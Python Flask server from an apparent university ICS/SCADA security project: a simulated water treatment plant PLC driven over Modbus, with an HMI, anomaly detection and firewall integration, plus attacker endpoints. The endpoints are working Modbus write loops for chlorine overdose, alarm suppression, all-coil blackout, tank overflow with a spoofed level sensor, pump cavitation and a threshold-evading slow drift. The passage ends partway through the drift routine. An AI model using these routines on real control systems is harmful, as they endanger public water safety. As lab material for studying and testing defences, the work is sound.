#!/usr/bin/env python3
"""
server.py — CPSS Dashboard Server (Phases 1–5)
===============================================
CPSS End-Semester Project: Attacks on a Water Treatment Plant PLC
ICS/SCADA Security — OpenPLC Runtime + Modbus TCP + IEC 61131-3

PURPOSE
-------
Single Flask process serving the unified SCADA dashboard and all supporting
API/SSE endpoints.  Replaces the original 6-file multi-page dashboard with
a single-page terminal at /dashboard.

ARCHITECTURE
------------
  ┌──────────────────────────────────────────────────────────────────────┐
  │  OpenPLC  (127.0.0.1:502)                                            │
  │    └─ pymodbus poller thread  →  plc_state dict  (shared, locked)   │
  │         └─ broadcasts to SSE queues every POLL_INTERVAL seconds      │
  └──────────────────────────────────────────────────────────────────────┘
  ┌──────────────────────────────────────────────────────────────────────┐
  │  Flask (port 5000)                                                   │
  │                                                                      │
  │  Pages                                                               │
  │    GET  /                    → hmi.html        (original HMI)        │
  │    GET  /dashboard           → dashboard.html  (unified SCADA term)  │
  │    GET  /attacker            → attacker.html   (legacy attack page)  │
  │    GET  /defense             → defense.html    (legacy defense page) │
  │    GET  /traffic             → traffic.html    (legacy traffic page) │
  │    GET  /apt                 → apt.html        (legacy APT page)     │
  │    GET  /report              → report.html     (legacy report page)  │
  │                                                                      │
  │  SSE Streams (push to browser, no polling needed)                    │
  │    GET  /hmi/stream          → PLC state (coils + regs + alarms)     │
  │    GET  /attacker/stream     → Attacker event log                    │
  │    GET  /dashboard/narrative → Structured attack narrative lines     │
  │    GET  /dashboard/traffic   → Live Modbus packet stream (Phase 5)   │
  │                                                                      │
  │  Attack API (POST, JSON body)                                        │
  │    POST /attacker/attack/chemical_overdose                           │
  │    POST /attacker/attack/alarm_suppress                              │
  │    POST /attacker/attack/blackout                                    │
  │    POST /attacker/attack/tank_overflow                               │
  │    POST /attacker/attack/slow_drift                                  │
  │    POST /attacker/attack/reset                                       │
  │    POST /attacker/attack/write_register                              │
  │    POST /attacker/attack/pump_cavitation                             │
  │                                                                      │
  │  Defense API                                                         │
  │    POST /defense/enable  /defense/disable                            │
  │    GET  /defense/stats   /defense/stream                             │
  │    GET  /traffic/packets /traffic/stats /traffic/packet/<seq>        │
  └──────────────────────────────────────────────────────────────────────┘

MODBUS REGISTER MAP
-------------------
  Coils 0–11: Intake_Pump, Intake_Valve, Chlorine_Pump, Coagulant_Pump,
              Dosing_Enable, Filter_Valve, UV_System, Reservoir_Inlet,
              Reservoir_Outlet, Distribution_Pump, Alarm_LED, System_Enable
  HR0:  Chlorine_Dose        (safe 0–800)
  HR1:  Coagulant_Dose       (safe 0–600)
  HR2:  Distribution_Speed   (safe 20–80)
  HR3:  Reservoir_Level_Pct  (safe 10–90)

DEPENDENCIES
------------
  flask, pymodbus, (optional) defense.modbus_firewall,
  defense.countermeasures, defense.packet_capture

Run:
    cd complete_project/dashboard
    python3 server.py

Demo URLs:
    http://localhost:5000/dashboard   ← unified SCADA terminal (Phase 1–5)
    http://localhost:5000/            ← original operator HMI
    http://localhost:5000/attacker    ← original attacker console
"""


import sys, os, time, json, threading, queue, logging, math, collections
from datetime import datetime
from flask import Flask, Response, render_template, jsonify, request

# ── Defense layer imports (optional — degrades gracefully if missing) ──────────
try:
    _defense_path = os.path.join(os.path.dirname(__file__), '..')
    sys.path.insert(0, _defense_path)
    from defense.modbus_firewall import get_stats_json as fw_stats, run_firewall, RULES as FW_RULES
    from defense.countermeasures import (
        run_countermeasures, get_cm_log, get_cm_summary,
        cm_log as _cm_log, CMS
    )
    from defense import packet_capture as _cap
    DEFENSE_AVAILABLE = True
except ImportError as _e:
    DEFENSE_AVAILABLE = False
    print(f"[!] Defense modules not loaded: {_e}")

def install_traffic_hook():
    """
    Monkey-patch packet_capture.record() so that every captured Modbus packet
    is also fanned out to dashboard traffic SSE clients in real time.

    We wrap the original record() function: the original still runs (so the
    ring-buffer and stats are unchanged), and we additionally call
    push_traffic_packet() with the resulting packet dict.

    This is safe to call multiple times — it checks for the sentinel attribute
    _traffic_hooked to avoid double-wrapping.
    """
    if not DEFENSE_AVAILABLE:
        return
    if getattr(_cap, '_traffic_hooked', False):
        return   # already installed — don't double-wrap

    _original_record = _cap.record

    def _hooked_record(data, src_ip, src_port, verdict="ALLOW",
                       rule_id=None, rule_name=None, mitre=None, direction="REQUEST"):
        # Call original so the ring-buffer and stats update normally
        _original_record(data, src_ip, src_port, verdict=verdict,
                         rule_id=rule_id, rule_name=rule_name,
                         mitre=mitre, direction=direction)
        # Find the packet that was just appended (last element of the deque)
        try:
            with _cap._lock:
                if _cap._packets:
                    pkt = _cap._packets[-1]
                    push_traffic_packet(pkt)
        except Exception:
            pass   # never let the hook crash the capture pipeline

    _cap.record = _hooked_record
    _cap._traffic_hooked = True

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("[!] pymodbus not found. Activate venv: source venv/bin/activate")
    sys.exit(1)

# ── Config ────────────────────────────────────────────────────────────────────
PLC_HOST      = "127.0.0.1"
PLC_PORT      = 5502    # ← route through modbus_firewall.py (port 5502 → 502)
                        #   This means every poll AND every attack write is recorded
                        #   by packet_capture.record() and shows up in the traffic table.
                        #   If the firewall isn't running, fall back to direct :502 below.
PLC_PORT_DIRECT = 502   # direct PLC port (used only if firewall is down)
POLL_INTERVAL = 1.0
MAX_HISTORY   = 120
LOG_MAX       = 200

logging.basicConfig(level=logging.WARNING)
app = Flask(__name__)

# ── Names & safe ranges ───────────────────────────────────────────────────────
COIL_NAMES = [
    "Intake_Pump", "Intake_Valve", "Chlorine_Pump", "Coagulant_Pump",
    "Dosing_Enable", "Filter_Valve", "UV_System", "Reservoir_Inlet",
    "Reservoir_Outlet", "Distribution_Pump", "Alarm_LED", "System_Enable",
]
REG_NAMES  = ["Chlorine_Dose", "Coagulant_Dose", "Distribution_Speed", "Reservoir_Level_Pct"]
REG_SAFE   = [(0, 800), (0, 600), (20, 80), (10, 90)]
REG_MAX    = [1000, 1000, 100, 100]
REG_THRESH = [800, 600, 80, 90]

# ── Shared state ──────────────────────────────────────────────────────────────
lock       = threading.Lock()
plc_state  = {"coils": [False]*12, "regs": [0]*4, "connected": False, "ts": ""}
history    = {"ts": [], "regs": [[] for _ in range(4)]}
alarm_log  = []
attack_log = []
anomaly_log= []

hmi_clients        = []   # SSE queues for HMI tabs
attacker_clients   = []   # SSE queues for attacker tabs
narrative_clients  = []   # SSE queues for dashboard narrative feed
traffic_clients    = []   # SSE queues for dashboard live traffic monitor

# ── Anomaly detector state ────────────────────────────────────────────────────
_anom = {
    "baseline_buf":  [[] for _ in range(4)],
    "baseline_ok":   False,
    "baseline_mean": [200.0, 300.0, 50.0, 50.0],
    "baseline_std":  [20.0,  30.0,  5.0,  5.0],
    "history":       collections.deque(maxlen=10),
    "sample_n":      0,
}
SIGMA_THRESH = 3.0
ROC_THRESH   = 30

def _std(data):
    if len(data) < 2: return 1.0
    m = sum(data) / len(data)
    v = sum((x - m) ** 2 for x in data) / (len(data) - 1)
    return math.sqrt(v) if v > 0 else 1.0

def run_anomaly(regs, coils):
    ts = datetime.now().strftime("%H:%M:%S")
    _anom["sample_n"] += 1
    n = _anom["sample_n"]

    if not _anom["baseline_ok"]:
        for j in range(4):
            _anom["baseline_buf"][j].append(regs[j])
        if n >= 60:
            _anom["baseline_mean"] = [sum(d)/len(d) for d in _anom["baseline_buf"]]
            _anom["baseline_std"]  = [_std(d)       for d in _anom["baseline_buf"]]
            _anom["baseline_ok"]   = True
        return

    _anom["history"].append(list(regs))

    def flag(level, register, msg, value, method):
        entry = {"ts": ts, "level": level, "register": register,
                 "msg": msg, "value": str(value), "method": method}
        with lock:
            anomaly_log.append(entry)
            if len(anomaly_log) > LOG_MAX:
                anomaly_log.pop(0)
            recent = [e["msg"] for e in alarm_log[-5:]]
            full_msg = f"[ANOMALY/{method}] {register}: {msg} (={value})"
            if full_msg not in recent:
                alarm_log.append({"ts": ts, "level": "DANGER" if level=="CRITICAL" else "WARNING",
                                   "msg": full_msg})

    for j in range(4):
        z = abs(regs[j] - _anom["baseline_mean"][j]) / _anom["baseline_std"][j]
        if z > SIGMA_THRESH:
            flag("CRITICAL" if regs[j] > REG_THRESH[j] else "WARNING",
                 REG_NAMES[j], f"Z-score {z:.1f}σ — statistically abnormal",
                 regs[j], "Z-score")

    if len(_anom["history"]) >= 5:
        old = list(_anom["history"])[0]
        for j in range(4):
            roc = regs[j] - old[j]
            if abs(roc) > ROC_THRESH:
                above = regs[j] > REG_THRESH[j]
                flag("CRITICAL" if above else "WARNING",
                     REG_NAMES[j],
                     f"Rate-of-change {roc:+d}/5s" +
                     ("" if above else " — below threshold, simple alarm would MISS this"),
                     regs[j], "RoC")

    if not coils[8] and coils[9]:
        flag("WARNING", "Coil", "Pump cavitation: outlet closed + pump ON", "", "Coil")
    if regs[0] > 600 and not coils[10] and coils[11]:
        flag("CRITICAL", "Alarm_LED",
             f"Alarm suppression suspected — Chlorine={regs[0]} elevated but Alarm_LED OFF",
             regs[0], "Coil")

# ── Modbus poller ─────────────────────────────────────────────────────────────
def poll_plc():
    """
    Background thread that polls the PLC every POLL_INTERVAL seconds.
    Connects via the firewall (port 5502) so every read is recorded by
    packet_capture and appears in the dashboard traffic table.
    Falls back to direct port 502 if firewall is not running.
    """
    # Try firewall port first, fall back to direct
    _port = PLC_PORT
    client = ModbusTcpClient(PLC_HOST, port=_port, timeout=2)
    if not client.connect():
        _port = PLC_PORT_DIRECT
        client = ModbusTcpClient(PLC_HOST, port=_port, timeout=2)
    prev_coils = [None]*12
    prev_regs  = [None]*4
    _defaults_written = False  # BUG2: track whether we've auto-written defaults

    while True:
        try:
            if not client.connected:
                client.connect()

            rc = client.read_coils(0, count=12)
            rr = client.read_holding_registers(0, count=4)
            if rc.isError() or rr.isError():
                raise Exception("read error")

            coils = list(rc.bits[:12])
            regs  = list(rr.registers[:4])
            ts    = datetime.now().strftime("%H:%M:%S")

            # BUG2 FIX: on first connected poll, if all registers are 0, write defaults once
            if not _defaults_written:
                if all(r == 0 for r in regs):
                    try:
                        client.write_registers(0, [200, 300, 50, 50])
                        client.write_coil(11, True)  # System_Enable = True
                        regs = [200, 300, 50, 50]
                        coils[11] = True
                        push_narrative("plc", "✔", "PLC",
                            "Auto-init: HR0=200 HR1=300 HR2=50 HR3=50 System_Enable=ON")
                    except Exception as _e:
                        push_narrative("plc", "✖", "PLC", f"Auto-init write failed: {_e}")
                _defaults_written = True

            with lock:
                plc_state.update({"coils": coils, "regs": regs,
                                  "connected": True, "ts": ts})

                history["ts"].append(ts)
                for i in range(4):
                    history["regs"][i].append(regs[i])
                if len(history["ts"]) > MAX_HISTORY:
                    history["ts"].pop(0)
                    for i in range(4):
                        history["regs"][i].pop(0)

                # Threshold alarms
                checks = [
                    (regs[0] > 800,          "DANGER",   f"Chlorine_Dose={regs[0]} — OVERDOSE (limit 800)"),
                    (regs[3] > 90,           "DANGER",   f"Reservoir_Level={regs[3]}% — OVERFLOW RISK"),
                    (regs[3] < 10 and coils[9], "WARNING", f"Reservoir_Level={regs[3]}% — pump running dry"),
                    (coils[10],              "WARNING",  "Alarm_LED active"),
                    (regs[0] > 800 and not coils[10], "CRITICAL",
                                                        "ALARM SUPPRESSION — overdose active but alarm OFF"),
                    (not coils[8] and coils[9], "WARNING", "Pump cavitation risk — outlet closed, pump ON"),
                ]
                for cond, level, msg in checks:
                    if cond:
                        recent = [e["msg"] for e in alarm_log[-5:]]
                        if msg not in recent:
                            alarm_log.append({"ts": ts, "msg": msg, "level": level})
                            if len(alarm_log) > LOG_MAX:
                                alarm_log.pop(0)

                changed_coils = [i for i in range(12) if coils[i] != prev_coils[i]]
                changed_regs  = [i for i in range(4)  if regs[i]  != prev_regs[i]]
                prev_coils[:] = coils
                prev_regs[:]  = regs

            run_anomaly(regs, coils)

            payload = json.dumps({
                "ts": ts, "coils": coils, "regs": regs,
                "alarms":       alarm_log[-10:],
                "anomalies":    anomaly_log[-5:],
                "history_ts":   history["ts"][-60:],
                "history_regs": [h[-60:] for h in history["regs"]],
                "changed_coils": changed_coils,
                "changed_regs":  changed_regs,
                "baseline_ready": _anom["baseline_ok"],
                "baseline_sample": _anom["sample_n"],
            })

            for client_list in [hmi_clients, attacker_clients]:
                dead = []
                for q in client_list:
                    try:
                        q.put_nowait(payload)
                    except queue.Full:
                        dead.append(q)
                for q in dead:
                    client_list.remove(q)

        except Exception:
            with lock:
                plc_state["connected"] = False
            time.sleep(2)
            try:
                client.close()
                client = ModbusTcpClient(PLC_HOST, port=_port, timeout=2)
            except:
                pass

        time.sleep(POLL_INTERVAL)

# ── SSE helper ────────────────────────────────────────────────────────────────
def sse_stream(client_list):
    q = queue.Queue(maxsize=10)
    client_list.append(q)

    def generate():
        try:
            with lock:
                initial = json.dumps({
                    "ts": plc_state["ts"], "coils": plc_state["coils"],
                    "regs": plc_state["regs"], "alarms": alarm_log[-10:],
                    "anomalies": anomaly_log[-5:],
                    "history_ts": history["ts"][-60:],
                    "history_regs": [h[-60:] for h in history["regs"]],
                    "changed_coils": [], "changed_regs": [],
                    "baseline_ready": _anom["baseline_ok"],
                    "baseline_sample": _anom["sample_n"],
                })
            yield f"data: {initial}\n\n"
            while True:
                try:
                    yield f"data: {q.get(timeout=30)}\n\n"
                except queue.Empty:
                    yield ": keepalive\n\n"
        except GeneratorExit:
            pass
        finally:
            if q in client_list:
                client_list.remove(q)

    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

# ── Modbus write helper ───────────────────────────────────────────────────────
def get_client():
    """
    Create a Modbus TCP client.

    Connection priority:
      1. Try PLC_PORT (5502) — routes through modbus_firewall.py so every
         write is inspected, recorded by packet_capture, and shown in the
         dashboard traffic table.
      2. If firewall is not running, fall back to PLC_PORT_DIRECT (502)
         so attacks still work during standalone demos.

    Timeout: 2s so attack endpoints fail fast with a clean JSON error
    instead of hanging the Flask thread when the PLC is unreachable.
    """
    # Try via firewall first
    try:
        c = ModbusTcpClient(PLC_HOST, port=PLC_PORT, timeout=2)
        if c.connect():
            return c
    except Exception:
        pass
    # Fallback: direct to PLC
    c = ModbusTcpClient(PLC_HOST, port=PLC_PORT_DIRECT, timeout=2)
    if not c.connect():
        raise Exception(f"Cannot connect to PLC at {PLC_HOST}:{PLC_PORT} or :{PLC_PORT_DIRECT}")
    return c

def log_attack(attack, params, result):
    ts = datetime.now().strftime("%H:%M:%S")
    with lock:
        attack_log.append({"ts": ts, "attack": attack, "params": str(params), "result": result})
        if len(attack_log) > LOG_MAX:
            attack_log.pop(0)

# BUG3 FIX: Real verdict from firewall stats
# The firewall runs as a SEPARATE PROCESS with its own stats object.
# We query its live HTTP stats server on port 5503 to get real rule_hits counts.
_verdict_snapshots: dict = {}   # rule_id → hit count at attack start
_FW_STATS_URL = "http://127.0.0.1:5503"

def _fetch_live_rule_hits() -> dict:
    """Fetch rule_hits dict from firewall's live stats HTTP server."""
    import urllib.request as _req
    try:
        with _req.urlopen(_FW_STATS_URL, timeout=1) as r:
            import json as _j
            return _j.loads(r.read()).get("rule_hits", {})
    except Exception:
        return {}

def snapshot_rule_hits(rule_id: str):
    """Record baseline block count BEFORE the attack starts."""
    hits = _fetch_live_rule_hits()
    _verdict_snapshots[rule_id] = hits.get(rule_id, 0)

def get_real_verdict(rule_id: str, window: float = 2.0) -> str:
    """
    Compare live rule_hits count vs snapshot taken before attack.
    If the count increased → firewall blocked it → 'blocked'.
    Returns 'blocked', 'allowed', or 'unknown'.
    """
    try:
        current = _fetch_live_rule_hits().get(rule_id, 0)
        baseline = _verdict_snapshots.get(rule_id, None)
        if baseline is None:
            return "blocked" if current > 0 else "unknown"
        return "blocked" if current > baseline else "allowed"
    except Exception:
        return "unknown"


def push_narrative(cls, icon, tag, msg):
    """Push a structured log line to all connected dashboard narrative SSE clients."""
    ts = datetime.now().strftime("%H:%M:%S")
    payload = json.dumps({"ts": ts, "cls": cls, "icon": icon, "tag": tag, "msg": msg})
    dead = []
    for q in narrative_clients:
        try:
            q.put_nowait(payload)
        except queue.Full:
            dead.append(q)
    for q in dead:
        if q in narrative_clients:
            narrative_clients.remove(q)

def push_traffic_packet(pkt: dict):
    """
    Push a decoded Modbus packet dict to all dashboard traffic SSE clients.

    Called by the packet_capture hook (see install_traffic_hook) every time
    a packet is recorded by the firewall/capture pipeline.

    Strips the packet down to only the fields the traffic table needs so the
    SSE payload stays small:
        ts, fc_name, register, value, verdict, rule_id, src_ip, direction
    """
    # Build a slim projection — only the columns shown in the traffic table
    slim = {
        "ts":        pkt.get("ts", ""),
        "fc":        pkt.get("fc_name", "?"),          # e.g. "WRITE_SINGLE_REGISTER"
        "register":  pkt.get("register", "—"),          # register/coil address or label
        "value":     pkt.get("value", "—"),             # value written (None for reads)
        "verdict":   pkt.get("verdict", "ALLOW"),       # "ALLOW", "BLOCK", or "ALERT"
        "rule_id":   pkt.get("rule_id", ""),            # e.g. "VAL-001" if blocked
        "src_ip":    pkt.get("src_ip", ""),
        "direction": pkt.get("direction", "REQUEST"),
    }
    payload = json.dumps(slim)
    dead = []
    for q in traffic_clients:
        try:
            q.put_nowait(payload)
        except queue.Full:
            dead.append(q)     # client too slow — drop it
    for q in dead:
        if q in traffic_clients:
            traffic_clients.remove(q)

# ════════════════════════════════════════════════════════════════
# ROUTES — OPERATOR HMI
# ════════════════════════════════════════════════════════════════
@app.route("/")
def index():
    """Root redirect → unified dashboard (hmi.html removed from templates)."""
    from flask import redirect
    return redirect("/dashboard")

@app.route("/dashboard")
def dashboard():
    """
    Unified single-page SCADA presentation terminal (v3 — cinematic rebuild).
    Replaces all 6 legacy HTML pages for presentation use.
    Reuses /hmi/stream, /dashboard/narrative, /dashboard/traffic SSE endpoints.
    """
    return render_template("dashboard.html")

@app.route("/dashboard/narrative")
def dashboard_narrative():
    """SSE stream of structured narrative log lines for the dashboard feed."""
    q = queue.Queue(maxsize=50)
    narrative_clients.append(q)

    def generate():
        try:
            # Send boot lines immediately on connect
            boot = [
                {"cls": "system", "icon": "◈", "tag": "SYSTEM", "msg": "Narrative feed connected"},
                {"cls": "firewall","icon": "◈","tag": "FIREWALL","msg": "7 rules loaded — VAL-001 through VAL-007"},
                {"cls": "sis",    "icon": "⚠", "tag": "SIS",     "msg": "SIS-1 armed — Cl hard limit 700, level 10–90%"},
                {"cls": "cm",     "icon": "✔", "tag": "CM-6",    "msg": "Anomaly engine active — Z-score + RoC detectors"},
            ]
            ts = datetime.now().strftime("%H:%M:%S")
            for line in boot:
                line["ts"] = ts
                yield f"data: {json.dumps(line)}\n\n"
            while True:
                try:
                    yield f"data: {q.get(timeout=30)}\n\n"
                except queue.Empty:
                    yield ": keepalive\n\n"
        except GeneratorExit:
            pass
        finally:
            if q in narrative_clients:
                narrative_clients.remove(q)

    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

@app.route("/dashboard/traffic")
def dashboard_traffic():
    """
    SSE stream of live Modbus packets for the dashboard traffic monitor table.

    Each event is a JSON object with these fields (subset of packet_capture schema):
        ts        — timestamp string "HH:MM:SS"
        fc        — function code name, e.g. "WRITE_SINGLE_REGISTER"
        register  — register/coil address or symbolic label
        value     — value written (None for reads)
        verdict   — "ALLOW", "BLOCK", or "ALERT"
        rule_id   — rule that matched, e.g. "VAL-001" (empty if ALLOW)
        src_ip    — source IP
        direction — "REQUEST" or "RESPONSE"

    On connect, sends the last 8 captured packets as seed data so the table
    is not empty while waiting for new traffic.
    If defense/packet_capture is not loaded, sends a single status event and
    then keeps the connection alive (table shows "capture unavailable").
    """
    q = queue.Queue(maxsize=30)
    traffic_clients.append(q)

    def generate():
        try:
            # Seed: send last 8 packets so the table is populated immediately
            if DEFENSE_AVAILABLE:
                try:
                    recent = _cap.get_packets(limit=8)
                    for pkt in recent:
                        slim = {
                            "ts":        pkt.get("ts", ""),
                            "fc":        pkt.get("fc_name", "?"),
                            "register":  pkt.get("register", "—"),
                            "value":     pkt.get("value", "—"),
                            "verdict":   pkt.get("verdict", "ALLOW"),
                            "rule_id":   pkt.get("rule_id", ""),
                            "src_ip":    pkt.get("src_ip", ""),
                            "direction": pkt.get("direction", "REQUEST"),
                            "seed":      True,   # flag so client knows it's history
                        }
                        yield f"data: {json.dumps(slim)}\n\n"
                except Exception:
                    pass
            else:
                # Defense layer not loaded — tell the table
                yield f"data: {json.dumps({'status': 'unavailable'})}\n\n"

            # Stream new packets pushed by the install_traffic_hook monkey-patch
            while True:
                try:
                    yield f"data: {q.get(timeout=30)}\n\n"
                except queue.Empty:
                    yield ": keepalive\n\n"
        except GeneratorExit:
            pass
        finally:
            if q in traffic_clients:
                traffic_clients.remove(q)

    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

@app.route("/hmi/stream")
def hmi_stream():
    return sse_stream(hmi_clients)

@app.route("/hmi/status")
def hmi_status():
    with lock:
        return jsonify({"connected": plc_state["connected"],
                        "ts": plc_state["ts"],
                        "coils": plc_state["coils"],
                        "regs":  plc_state["regs"],
                        "alarms": alarm_log[-20:]})

# ════════════════════════════════════════════════════════════════
# ROUTES — ATTACKER CONSOLE
# ════════════════════════════════════════════════════════════════
@app.route("/attacker")
def attacker():
    return render_template("attacker.html",
                           coil_names=COIL_NAMES, reg_names=REG_NAMES,
                           reg_safe=REG_SAFE, reg_max=REG_MAX)

@app.route("/attacker/stream")
def attacker_stream():
    return sse_stream(attacker_clients)

@app.route("/attacker/attack_log")
def get_attack_log():
    with lock:
        return jsonify(attack_log[-50:])

@app.route("/attacker/anomaly_log")
def get_anomaly_log():
    with lock:
        return jsonify(anomaly_log[-50:])

# ── Attack endpoints ──────────────────────────────────────────────────────────
@app.route("/attacker/attack/force_coil", methods=["POST"])
def attack_force_coil():
    d = request.json or {}
    coil, value, cycles = int(d.get("coil",0)), bool(d.get("value",False)), int(d.get("cycles",50))
    try:
        c = get_client()
        for _ in range(cycles):
            c.write_coil(coil, value)
            time.sleep(0.01)
        c.close()
        msg = f"Coil {coil} ({COIL_NAMES[coil]}) forced {'ON' if value else 'OFF'} ×{cycles}"
        log_attack("Force Coil", d, msg)
        return jsonify({"ok": True, "msg": msg})
    except Exception as e:
        return jsonify({"ok": False, "msg": str(e)}), 500

@app.route("/attacker/attack/chemical_overdose", methods=["POST"])
def attack_chemical_overdose():
    d = request.json or {}
    dose, dur = int(d.get("dose",1000)), int(d.get("duration",5))
    try:
        snapshot_rule_hits("VAL-001")  # BUG3: snapshot before attack
        push_narrative("attack",   "►", "ATTACK",   f"Writing Chlorine_Dose={dose} to HR0 via FC06")
        push_narrative("firewall", "◈", "FIREWALL", f"VAL-001 evaluating — overdose limit 800, value={dose}")
        c = get_client()
        push_narrative("attack",   "►", "ATTACK",   f"Connected to {PLC_HOST}:{PLC_PORT} — sustained write for {dur}s")
        deadline = time.time() + dur
        while time.time() < deadline:
            c.write_register(0, dose)
            time.sleep(0.05)
        c.close()
        msg = f"Chlorine_Dose set to {dose} for {dur}s (threshold 800)"
        verdict = get_real_verdict("VAL-001", window=dur+2)
        push_narrative("plc",  "✔", "PLC",  f"Cl={dose} written — {dur}s sustained")
        push_narrative("sis",  "⚠", "SIS",  f"Cl={dose} > hard limit 700 — SIS-1 would fire")
        push_narrative("cm",   "✔", "CM-6", f"Z-score anomaly expected — Cl deviation from baseline")
        if verdict == "blocked":
            push_narrative("firewall", "◈", "FIREWALL", "VAL-001 BLOCKED — Chlorine_Dose write rejected")
        log_attack("Chemical Overdose", d, msg)
        return jsonify({"ok": True, "msg": msg, "verdict": verdict})
    except Exception as e:
        push_narrative("attack", "✖", "ERROR", f"chemical_overdose failed: {e}")
        return jsonify({"ok": False, "msg": str(e)}), 500

@app.route("/attacker/attack/silent_overdose", methods=["POST"])
def attack_silent_overdose():
    d = request.json or {}
    dose, dur = int(d.get("dose",1000)), int(d.get("duration",8))
    try:
        c = get_client()
        deadline = time.time() + dur
        while time.time() < deadline:
            c.write_register(0, dose)
            c.write_coil(10, False)
            time.sleep(0.05)
        c.close()
        msg = f"Silent overdose: Cl={dose} + alarm suppressed for {dur}s — Oldsmar pattern"
        log_attack("Silent Overdose", d, msg)
        return jsonify({"ok": True, "msg": msg})
    except Exception as e:
        return jsonify({"ok": False, "msg": str(e)}), 500

@app.route("/attacker/attack/alarm_suppress", methods=["POST"])
def attack_alarm_suppress():
    d = request.json or {}
    dur = int(d.get("duration",5))
    try:
        snapshot_rule_hits("INT-001")  # BUG3: snapshot before attack
        push_narrative("attack",   "►", "ATTACK",   "Forcing Coil 10 (Alarm_LED) → OFF via FC05")
        push_narrative("attack",   "►", "ATTACK",   f"Oldsmar pattern — alarm silenced for {dur}s")
        push_narrative("firewall", "◈", "FIREWALL", "VAL-004 evaluating alarm-suppress write")
        c = get_client()
        deadline = time.time() + dur
        while time.time() < deadline:
            c.write_coil(10, False)
            time.sleep(0.02)
        c.close()
        msg = f"Alarm_LED suppressed for {dur}s"
        verdict = get_real_verdict("INT-001", window=dur+2)
        push_narrative("plc",  "✔", "PLC",  f"Alarm_LED held OFF for {dur}s")
        push_narrative("sis",  "⚠", "SIS",  "Suppression active — SIS-2 cross-check triggered")
        push_narrative("cm",   "✔", "CM-6", "Coil anomaly: Alarm_LED=OFF with elevated registers")
        if verdict == "blocked":
            push_narrative("firewall", "◈", "FIREWALL", "INT-001 BLOCKED — Alarm_LED force-off rejected")
        log_attack("Alarm Suppression", d, msg)
        return jsonify({"ok": True, "msg": msg, "verdict": verdict})
    except Exception as e:
        push_narrative("attack", "✖", "ERROR", f"alarm_suppress failed: {e}")
        return jsonify({"ok": False, "msg": str(e)}), 500

@app.route("/attacker/attack/blackout", methods=["POST"])
def attack_blackout():
    d = request.json or {}
    dur = int(d.get("duration", 6))
    try:
        snapshot_rule_hits("INT-002")  # BUG3: snapshot before attack
        push_narrative("attack",   "►", "ATTACK",   "Writing FC15 — all 12 coils → FALSE")
        push_narrative("attack",   "►", "ATTACK",   f"Sustained coil-OFF loop for {dur}s — plant cannot recover")
        push_narrative("firewall", "◈", "FIREWALL", "INT-002 evaluating mass-coil write")
        c = get_client()
        deadline = time.time() + dur
        while time.time() < deadline:
            c.write_coils(0, [False]*12)
            time.sleep(0.05)
        c.close()
        msg = f"All 12 coils → OFF sustained {dur}s — system blackout"
        verdict = get_real_verdict("INT-002", window=dur+2)
        push_narrative("plc",  "✔", "PLC",  f"All 12 coils held OFF for {dur}s")
        push_narrative("sis",  "⚠", "SIS",  "System_Enable=OFF — SIS-3 would fire")
        push_narrative("cm",   "✔", "CM-6", "Mass-coil-OFF detected — safety intervention flag")
        if verdict == "blocked":
            push_narrative("firewall", "◈", "FIREWALL", "INT-002 BLOCKED — blackout write rejected")
        log_attack("System Blackout", {}, msg)
        return jsonify({"ok": True, "msg": msg, "verdict": verdict})
    except Exception as e:
        push_narrative("attack", "✖", "ERROR", f"blackout failed: {e}")
        return jsonify({"ok": False, "msg": str(e)}), 500

@app.route("/attacker/attack/tank_overflow", methods=["POST"])
def attack_tank_overflow():
    d = request.json or {}
    dur = int(d.get("duration",5))
    try:
        snapshot_rule_hits("INT-003")  # BUG3: snapshot before attack
        push_narrative("attack",   "►", "ATTACK",   "Forcing Reservoir_Inlet (Coil 7) → ON via FC05")
        push_narrative("attack",   "►", "ATTACK",   "Spoofing Reservoir_Level_Pct (HR3) → 0 via FC06")
        push_narrative("attack",   "►", "ATTACK",   f"Physical level rising — sensor reads zero for {dur}s")
        push_narrative("firewall", "◈", "FIREWALL", "VAL-003 evaluating reservoir sensor write")
        c = get_client()
        deadline = time.time() + dur
        while time.time() < deadline:
            c.write_coil(7, True)
            c.write_register(3, 0)
            time.sleep(0.05)
        c.close()
        msg = f"Tank overflow: inlet forced ON, level spoofed=0 for {dur}s"
        verdict = get_real_verdict("INT-003", window=dur+2)
        push_narrative("plc",  "✔", "PLC",  f"Inlet=ON, Level=0 sustained {dur}s")
        push_narrative("sis",  "⚠", "SIS",  "Inlet forced with spoofed low level — SIS-4 overflow flag")
        push_narrative("cm",   "✔", "CM-6", "Inlet ON + sensor=0 correlation anomaly detected")
        if verdict == "blocked":
            push_narrative("firewall", "◈", "FIREWALL", "INT-003 ALERTED — Tank overflow pattern detected")
        log_attack("Tank Overflow", d, msg)
        return jsonify({"ok": True, "msg": msg, "verdict": verdict})
    except Exception as e:
        push_narrative("attack", "✖", "ERROR", f"tank_overflow failed: {e}")
        return jsonify({"ok": False, "msg": str(e)}), 500

@app.route("/attacker/attack/pump_cavitation", methods=["POST"])
def attack_pump_cavitation():
    d = request.json or {}
    dur = int(d.get("duration",5))
    try:
        c = get_client()
        deadline = time.time() + dur
        while time.time() < deadline:
            c.write_coil(8, False)
            c.write_coil(9, True)
            time.sleep(0.05)
        c.close()
        msg = f"Pump cavitation: outlet closed + pump ON for {dur}s"
        log_attack("Pump Cavitation", d, msg)
        return jsonify({"ok": True, "msg": msg})
    except Exception as e:
        return jsonify({"ok": False, "msg": str(e)}), 500

@app.route("/attacker/attack/slow_drift", methods=["POST"])
def attack_slow_drift():
    d = request.json or {}
    steps = int(d.get("steps", 15))
    snapshot_rule_hits("VAL-007")  # snapshot before drift starts
    def drift():
        try:
            c = get_client()
            with lock:
                start = plc_state["regs"][0]
            push_narrative("attack", "►", "ATTACK", f"Slow drift started — {steps} steps × 2s = {steps*2}s")
            push_narrative("attack", "►", "ATTACK", f"HR0 (Cl) +10/step from {start}, HR2 (Speed) -3/step")
            push_narrative("attack", "►", "ATTACK", "Designed to evade threshold-only alarms (no step exceeds limit alone)")
            blocked_at = None
            for i in range(steps):
                new_cl    = min(1000, start + (i+1)*10)
